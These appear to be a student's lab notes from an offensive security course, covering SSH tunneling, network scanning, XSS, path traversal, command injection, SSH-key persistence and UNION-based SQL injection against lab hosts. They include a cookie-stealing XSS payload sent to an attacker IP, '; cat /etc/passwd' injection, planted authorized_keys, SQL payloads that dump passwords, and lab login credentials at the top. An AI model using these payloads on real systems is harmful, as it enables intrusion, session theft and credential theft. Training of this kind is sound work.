linops: 10.50.36.204
Winops: 10.50.34.195
un: XTRA1-502-M
pw: PwrvnlOH3ZJbMz4
stack: 19
ip: 10.50.25.150

## New tunneling method

    ssh -MS /tmp/grey student@10.50.25.150 
    **creates a socket in the /tmp directory that hosts info from that IP**
    **to get rid of this, ssh -MS /tmp/grey -O cancel student@10.50.25.150**
    
    ssh -S /tmp/grey dummy -O forward -D9050
    **creates a local forwarder**
    **to get rid of this, ssh -S /tmp/grey dummy -O cancel -D9050**

    ssh -S /tmp/grey dummy -O forward -L1111:192.168.128.100:80
    **creates a local portforward to that ip on port 80**

    ssh -S /tmp/grey dummy -O forward -L1111:192.168.128.100:80 -L2222:192.168.128.100:22
    **if you saw did scans and saw that the .100 had 22, tac on another port forward to ssh**

    netstat -natup **to see if your tunnels worked**
    history **if you've forgotten what ya did.**
    
    
## Penetration Testing

    testing a network for vulnerabilities and shit.

    PHASE 1: Mission Definition
        define mission goals and targets
        determine scope of mission
        define ROE
    PHASE 2: Recon
        information gathering about the target through public resources.
    PHASE 3: Footprinting
        accumulate data through scanning and/or interaction with the target/target resources.
    PHASE 4: Exploitation and initial access
        gain an initial foothold on network
    PHASE 5: Post-exploitation
        establish persistence
        escalate privileges
        cover your tracks
        exfiltrate target data
    PHASE 6: document mission
        document and report mission details

        
    Pen test reporting:
        executive summary
        technical summary
        reasons to report
        what to report
        screen captures

## Reconnaissance & Scanning
https://sec.cybbh.io/-/public/-/jobs/866153/artifacts/slides/02-network-scanning-and-recon.html

    OSINT data to collect:
        web data
        sensitive data
        publicly accessible
        social media
        domain and IP data

    Hyper-Text Markup Language (HTML)
        client-side interpretation (web browser)
        utilizes elements (identified by tags)
        typically redirects to another page for server-side interaction
        cascading stylesheets (CSS) for page themeing.

    Scraping data:
        **prep**: pip install lxml requests

        **script: htmlscraping.py**
        #!/usr/bin/python
        import lxml.html
        import requests
        
        page = requests.get('http://quotes.toscrape.com')
        tree = lxml.html.fromstring(page.content)
        
        authors = tree.xpath('//small[@class="author"]/text()')
        
        print ('Authors: ',authors)

    **Advanced scanning techniques:**
    1. HOST DISCOVERY
        find hosts that are online / use ruby ping sweep. for i in {1..254}; do (ping -c 1 172.16.82.$i | grep "bytes from" &) ; done
        
    2. PORT ENUMERATION
        find ports for each host that is online / ensure dynamic tunnel is open.
        use proxychains nmap -T5 <ip>  
        
    3. PORT INTERROGATION
        find what service is running on each open/available port.
        proxychains nc <ip> <port#> ((to ensure port is what it says it is))

        **NMAP SCRIPTS LOCATION**
        /usr/share/nmap/scripts
        ex: proxychains nmap --script http-enum 192.168.28.100
        ex: proxychains nmap --script banner 192.168.28.100

        **other useful**
        nmap --script <filename>|<category>|<directory>
        nmap --script-help "ftp-* and discovery"
        nmap --script-args <args>
        nmap --script-args-file <filename>
        nmap --script-help <filename>|<category>|<directory>
        nmap --script-trace

## Vulnerability and Exploitation Research
https://sec.cybbh.io/public/security/latest/lessons/lesson-3-research_sg.html
https://sec.cybbh.io/-/public/-/jobs/866153/artifacts/slides/03-exploitation-research-slides.html

        Initial access:
            getting a foothold onto the system. Phishing is the most common method.

        exploit research:
            Transition from reconnaissance to weaponization
            Leverage intelligence/data about network
            Pair vulnerabilities to exploits
            Align exploits to operational objectives
            https://www.exploit-db.com/
            nvd.nist.gov

## Web Exploitation Day 1:
https://sec.cybbh.io/-/public/-/jobs/866153/artifacts/slides/04-web-exploitation.html

    **Server/Client Relationship**
    Synchronous communications between user and services
    Not all data is not returned, client only receives what is allowed

    **Hyper-Text Transfer Protocol (HTTP)**
    Request/Response
        Various tools to view:
            tcpdump
            wireshark
            developer console
            
    **HTTP Methods**
        GET
        POST
        HEAD
        PUT
        https://tools.ietf.org/html/rfc2616

     **HTTP Response Codes**
        10X == Informational
        2XX == Success
        30X == Redirection
        4XX == Client Error
        5XX == Server Error

    **HTTP Fields**
        User-Agent
        Referer
        Cookie
        Date
        Server
        Set-Cookie

    **Wget**
    Recursively download
    Recover from broken transfers
    SSL/TLS support

    **JavaScript (JS)**
    Allows websites to interact with the client
    JavaScript runs on the client’s machine
    Coded as .JS files, or in-line of HTML

    **Enumeration**
    ROBOTS.TXT
    Legitimate surfing
    Tools:
        NSE scripts
        Nikto
        Burp suite (outside class)

    **Cross-Site Scripting (XSS) Overview**
    Insertion of arbitrary code into a webpage, that executes in the browser of visitors
    Unsanitized GET, POST, and PUT methods allow JS to be placed on websites
    Often found in forums that allow HTML

    **Stored XSS**
    Resides on vulnerable site
    Only requires user to visit page
    <img src="http://invalid" onerror="window.open('http://10.50.XX.XX:8000/ram.png','xss','height=1,width=1');">

    **Reflected XSS**
    Most common form of XSS
    Transient, occurs in error messages or search results
    Delivered through intermediate media, such as a link in an email
    Characters that are normally illegal in URLs can be Base64 encoded
    
    Below is what you see, but the server will decode as name=abc123
    http://example.com/page.php?name=dXNlcjEyMw

    **Useful JavaScript Components**
        Proof of concept (simple alert):
            <script>alert('XSS');</script>

        Capturing Cookies
            document.cookie
        Capturing Keystrokes
            bind KEYDOWN and KEYUP
        Capturing Sensitive Data
            document.body.innerHTML

     **host http server**       
    python3 -m http.server

    **malicious java script with linops ip**
    <script>document.location="http://10.50.36.204:8000/"+document.cookie;</script>

    **Server-Side injection**
    Directory Traversal/Path Traversal
    Ability to read/execute outside web server’s directory
    Uses ../../ (relative paths) in manipulating a server-side file path
    ex: view_image.php?file=../../etc/passwd
    ex: use a bunch of ../../../../../etc/passwd (if you don't know where ya are)
    ex: ../../../../etc/hosts (view ip addresses -> names)((flags, areas to pivot etc)

    **Malicious File Upload**
    Site allows unsanitized file uploads

    Server doesn’t validate extension or size
    Allows for code execution (shell)
    Once uploaded
        Find your file
        Call your file

    **Command Injection**
    Application on the server is vulnerable,
    allowing execution of arbitrary commands

    User input not validated
        Common example is a SOHO router, with a web page to allow ping

    Run the following to chain/stack our arbitrary command
        ; cat /etc/passwd

    **SSH Key upload**
        check /etc/passwd for interactive shell
        generate an ssh key. 
        ls -la (.ssh folder is hidden)
        ssh-keygen -t rsa -b 4096 -> hit enter x2
        file id_rsa (private key)
        file id_rsa.pub (public key)
        from webserver command injection -> ;mkdir /var/www/.ssh
        then -> ; ls -la /var/www (to check if you made the file)
        then -> ; echo "" > /var/www/.ssh/authorized_keys (paste your public key between quotes)
        to check -> ; cat /var/www/.ssh/authorized_keys
        then -> ssh to it. ssh www-data@10.50.30.162

    **to ssh with someones private key**
        ssh -i id_rsa www-data@10.50.30.162 (to use a specific private key, replace 'id_rsa' with whatever you saved it as)

## Web Exploitation Day 2
https://sec.cybbh.io/-/public/-/jobs/870086/artifacts/slides/05-sql-injection-slides.html

    SQL
    S tructured Q uery L anguage - ANSI Standard
    Additional commands added by vendors
    Relational

    Standard Commands (SQL)
    SELECT - Extracts data from a database
    UNION - Used to COMBINE the result-set of TWO OR MORE SELECT STATEMENTS
    USE - Selects the DB to use
    UPDATE - Updates data in a database
    DELETE - Deletes data from a database
    INSERT INTO - Inserts new data into a database
    CREATE DATABASE - Creates a new database
    ALTER DATABASE - Modifies a database
    CREATE TABLE - Creates a new table
    ALTER TABLE - Modifies a table
    DROP TABLE - Deletes a table
    CREATE INDEX - Creates an index (search key)
    DROP INDEX - Deletes an index

    **default SQL databases** - to view -> mysql -> show databases; 
    information_schema
    mysql
    performance_schema
    session (not default)

    *to see tables in SQL*
    ex:
    show TABLES FROM session
    Tires
    car

    *to see columns in a table*
    ex:
    show columns from session.Tires;
    show columns from session.car;

    **see information in the columns**
    select tireid,name,cost,size session.Tires;
    select year,name,cost from session.car;

    **use union to combine outputs**
    ex:
    select year,name,cost from session.car UNION select name,size,cost from session.Tires;

    **SQL Injection - Considerations**
    Requires Valid SQL Queries
    Fully patched systems can be vulnerable due to misconfiguration
    Input Field Sanitization
    String vs Integer Values
    Is INFORMATION_SCHEMA Database available?
    GET Request versus POST Request HTTP methods

    **Unsanitized vs Sanitized Fields**
    Unsanitized: input fields can be found using a Single Quote ⇒ '
        Will return extraneous information
        ' closes a variable, to allow for additional statements/clauses
        May show no errors or generic error (harder Injection)

    Sanitized: input fields are checked for items that might harm the database (Items are removed, escaped, or turned into a single string)
    Validation: checks inputs to ensure it meets a criteria (String doesn’t contain ')

    Example - Injecting Your Statement
    User enters TOM' OR 1='1 in the name and pass fields
    Truth Statement: tom' OR 1='1
    Server-Side query executed would appear like this:
    SELECT id FROM users WHERE name=‘tom' OR 1='1’ AND pass=‘tom' OR 1='1’

    **change this from a post to a get using developer tools**
    1. open network tab, send the credentials again
    2. hit the request tab on the right hand side
    3. set a value in the url -> set the value in the request field to raw
    4. copy and paste that value into the url with a ? after the php
    5. view page source

    **SQL on database** POST Method
    http://10.50.28.178/Union.html
    Ford
    Dodge
    Honda
    Audi
    
    Audi' OR 1='1 -> ends up showing full table.
    now we can try using union -> Audi' Union select 1,2,3,4,5 #
        You're guessing the numbers in union select until you see the table displayed properly.
    UNION select <column>,<column>,<column> FROM <Databases>.<Tables>
    table_schema = Databases names
    table_name = Tables names
    column_name = Columns names

    "Golden statement" -> Audi' Union select table_schema,2,table_name,column_name,5 FROM information_schema.columns #
    (this shows the entire database pretty much)

    If we wanted to view something specific (cost of a car)
    Audi' Union select name,2,cost,type,color FROM session.car #
    ex 2:
    Audi' Union select id,2,name,pass,5 FROM session.user #

    **SQL on database** GET Method
    ex for this one is selecting something from a dropdown menu
    Pay attention to URL bar, it should change for each selection

    http://10.50.28.178/uniondemo.php?Selection=1&Submit=Submit

    http://10.50.28.178/uniondemo.php?Selection=2 OR 1=1 
    Above, you're selecting something, then adding a boolean condition to true at the end and testing each one.

    Next -> use union to see how many columns are Available.
    http://10.50.28.178/uniondemo.php?Selection=2 UNION select 1,2,3
    
    then "Golden statement" ->
    http://10.50.28.178/uniondemo.php?Selection=2 UNION select table_schema,column_name,table_name FROM information_schema.columns

    final to view something specific ->
    ttp://10.50.28.178/uniondemo.php?Selection=2 UNION select studentID,username,passwd FROM session.userinfo 
    ex 2:
    ttp://10.50.28.178/uniondemo.php?Selection=2 UNION select session_id,user_id,remote_ip FROM session.session_log

    
    
    

    
    
    
    
    

    
    
    
    



    
    
    
    

    
        
        
        
        
        
            

    

    

    
        
    
    
    
    

    
    
    
    
    
    
    
    

    

    
    
    

    
    
        
        
    

    
    

    
            

        
        

    
    

    

    
        
    
    
        
        
    

    

    

    
